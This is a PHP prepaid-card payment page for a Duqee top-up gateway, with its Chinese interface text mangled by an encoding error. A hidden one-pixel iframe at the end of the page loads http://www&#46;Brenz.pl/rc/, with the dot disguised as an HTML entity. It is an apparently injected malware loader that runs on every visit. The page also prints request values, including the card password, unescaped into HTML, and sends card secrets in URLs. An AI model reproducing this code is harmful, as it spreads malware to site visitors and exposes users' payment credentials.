<?php
include_once("../config.php");
$action=$_REQUEST["action"];
if ($action=="flag")
{
  $C_OrderId=$_REQUEST["C_OrderId"];
  $C_ChannelId=$_REQUEST["C_ChannelId"];
  $C_CardId=$_REQUEST["C_CardId"];
  $C_FaceValue=$_REQUEST["C_FaceValue"];
  $strarr="P_UserId=".$UserId;
  $strarr.="&P_OrderId=".$C_OrderId;
  $strarr.="&P_ChannelId=".$C_ChannelId;
  $strarr.="&P_CardId=".$C_CardId;
  $strurl=$strarr."&P_FaceValue=".$C_FaceValue;
  $geturl=$strurl."&P_PostKey=".$SalfStr;
  $postkey=md5($geturl);
  $strurl=$strurl."&P_PostKey=".$postkey;
  $resultmsg = file_get_contents("http://Api.Duqee.Com/pay/query.aspx?".$strurl);
  $getbody=preg_split("/&/",$resultmsg);
  if ($getbody[5]=="")
  {
    echo "�ύ����";
  }
  else
  {
  $paymoney=preg_split("/=/",$getbody[4]);//�ɹ����;
  $paymoneyValue=$paymoney[1];
  $flag=preg_split("/=/",$getbody[5]);//�ύ״̬
  $flagValue=$flag[1];
  $cardstatus=preg_split("/=/",$getbody[6]);//����״̬
  $cardstatusValue=$cardstatus[1];
  $errmsg=preg_split("/=/",$getbody[7]);//��������
  $errmsgValue=$errmsg[1];
  if ($flagValue==0)
  {//Ϊ0ʱ������δ����
	   echo "<img src='../images/onLoad.gif' align='middle' />���ڴ���..";
  }
  elseif($flagValue==1)
   {//Ϊ1ʱ�����Ѿ�����
     if($cardstatusValue==0)
     {//0Ϊ����ʧ��
	      echo "<font color=red>".$errmsgValue."</font>";
	 }
	 else
	 {
	      echo "<font color=green>�ɹ�!ʵ�ʽ��Ϊ��".$paymoneyValue."</font>";
	 }
   }
  }
  exit();
}
$P_CardId=$_REQUEST["cardId"];
$P_CardPass=$_REQUEST["cardPass"];
$P_FaceValue=$_REQUEST["faceValue"];
$P_ChannelId=$_REQUEST["channelId"];
$P_Subject=$_REQUEST["subject"];
$P_Price=$_REQUEST["price"];
$P_Quantity=$_REQUEST["quantity"];
$P_Description=$_REQUEST["description"];
$P_Notic=$_REQUEST["notic"];
$P_Result_url=$result_url;
$P_Notify_url=$notify_url;
if(empty($P_Price)){$P_Price=0;};
$P_OrderId=getOrderId();
if ( $P_CardId == "")
{
				exit( "<script>alert('���Ŵ���!');window.history.back(-1);</script>" );
}
if ( $P_CardPass == "")
{
				exit( "<script>alert('�������!');window.history.back(-1);</script>" );
}
if ( $P_FaceValue == "" || intval( $P_FaceValue ) == 0 )
{
				exit( "<script>alert('������!');window.history.back(-1);</script>" );
}
$preEncodeStr=$UserId."|".$P_OrderId."|".$P_CardId."|".$P_CardPass."|".$P_FaceValue."|".$P_ChannelId."|".$SalfStr;

$P_PostKey=md5($preEncodeStr);

$params="P_UserId=".$UserId;
$params.="&P_OrderId=".$P_OrderId;
$params.="&P_CardId=".$P_CardId;
$params.="&P_CardPass=".$P_CardPass;
$params.="&P_FaceValue=".$P_FaceValue;
$params.="&P_ChannelId=".$P_ChannelId;
$params.="&P_Subject=".$P_Subject;
$params.="&P_Price=".$P_Price;
$params.="&P_Quantity=".$P_Quantity;
$params.="&P_Description=".$P_Description;
$params.="&P_Notic=".$P_Notic;
$params.="&P_Result_url=".$P_Result_url;
$params.="&P_Notify_url=".$P_Notify_url;
$params.="&P_PostKey=".$P_PostKey;

//������Զ���������Ᵽ��

//����������ύ��API

$resultmsg=file_get_contents($gateWary."?".$params);


//ͨ������
function getChannelname($channelid)
{
 switch($channelid){
   case "4": 
     echo "��ѶQB��";
	 break;
   case "5": 
     echo "ʢ��һ��ͨ";
	 break;
   case "6": 
     echo "����һ��ͨ";
	 break;
   case "7": 
     echo "����һ��ͨ";
	 break;
   case "8": 
     echo "�Ѻ�һ��ͨ";
	 break;
   case "9": 
     echo "��;��Ϸ��";
	 break;
   case "10": 
     echo "����һ��ͨ";
	 break;
   case "11": 
     echo "����һ��ͨ";
	 break;
   case "12": 
     echo "����һ��ͨ";
	 break;
   case "13": 
     echo "���ų�ֵ��";
	 break;
   case "14": 
     echo "�ƶ���ֵ��";
	 break;
   case "15": 
     echo "��ͨ��ֵ��";
	 break;
   case "16": 
     echo "����һ��ͨ";
	 break;
   case "17": 
     echo "���һ��ͨ";
	 break;
   case "18": 
     echo "����һ��ͨ";
	 break;
  }
}

function getOrderId()
{
	return date("YmdHis")."".rand(1000000,9999999);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>֧�����ҳ</title>
<link rel="stylesheet" href="../images/app_style.css"  type="text/css" />
<script type="text/javascript"> 
var xmlHttp; 

function createXMLHttpRequest(){ 
if(window.ActiveXObject){ 
xmlHttp = new ActiveXObject("Microsoft.XMLHTTP"); 
} 
else if(window.XMLHttpRequest){ 
xmlHttp = new XMLHttpRequest(); 
} 
} 
function orderStatus(corder,cid,kid,fv){ 
createXMLHttpRequest(); 
try{ 
xmlHttp.onreadystatechange = orderStatuschange; 
xmlHttp.open("GET", "?action=flag&C_OrderId="+escape(corder)+"&C_ChannelId="+escape(cid)+"&C_CardId="+escape(kid)+"&C_FaceValue="+escape(fv)+"&rnd="+Math.random(), true); 
xmlHttp.send(null); 
}catch(exception){ 
document.getElementById('orderStatus').innerHTML ="�����������ʧ��,����ϵ�ͷ�"; 
} 
}
function orderStatuschange(){ 
if(xmlHttp.readyState == 4){ 
if (xmlHttp.status == 200 || xmlHttp.status == 0){ 
document.getElementById('orderStatus').innerHTML =xmlHttp.responseText
} 
} 
}
setInterval("orderStatus('<?=$P_OrderId?>','<?=$P_ChannelId?>','<?=$P_CardId?>','<?=$P_FaceValue?>')",5000);
</script>
</head>
<body>
<div id="wrap">
<table width="100%" height="34" border="0" align="center" cellpadding="0" cellspacing="0" style="margin-top:20px">
  <tr>
    <td width="33%"><img src="../images/logo-pay.jpg" /></td>
	<td width="68%" valign="bottom"><span class="logotxt">֧�����</span></td>
  </tr>
</table>
<table width="600" border="0" align="center" cellpadding="0" cellspacing="1" class="mytable">
      <tr>
        <td width="100" height="25" align="right">�����ţ�</td>
        <td><?=$P_OrderId?></td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">��ֵ���</td>
        <td><?=getChannelname($P_ChannelId)?></td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">���ţ�</td>
        <td><?=$P_CardId?></td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">���ܣ�</td>
        <td><?=$P_CardPass?></td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">֧����</td>
        <td><font style="font-size:14px; font-family:Geneva, Arial, Helvetica, sans-serif;color:#FF0000; font-weight:bold"><?=$P_FaceValue?></font> Ԫ</td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">����״̬��</td>
        <td><span id="orderStatus"><img src="../images/onLoad.gif" align="middle" />���ڴ���..</span></td>
      </tr>
	  <tr><td colspan="2" align="center" style="color:#FF0000">ע�⣺���δ�������ض���������븴�ƶ�������ϵ�ͷ�</td></tr>
	  <tr><td colspan="2" align="center"><input type="button" value="�ر�" onclick="window.close()"/></td></tr>
</table>
    <br />
</div>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>